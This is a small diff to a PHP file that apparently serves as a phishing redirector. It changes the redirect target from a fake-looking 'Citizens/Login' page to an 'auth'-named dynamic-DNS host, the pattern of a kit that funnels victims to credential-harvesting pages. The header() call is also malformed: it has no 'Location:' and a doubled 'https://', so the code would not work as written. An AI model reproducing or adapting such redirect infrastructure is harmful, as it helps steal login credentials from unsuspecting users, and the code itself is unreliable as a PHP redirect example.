@@ -1,7 +1,7 @@
 <?php 
   
 // Redirect browser 
-header("https://madeawaymilmore.wwwhost.us/Citizens/Login/"); 
+header("https://https://sesucre02-auth47.duckdns.org/"); 
   
 exit; 
 ?> 
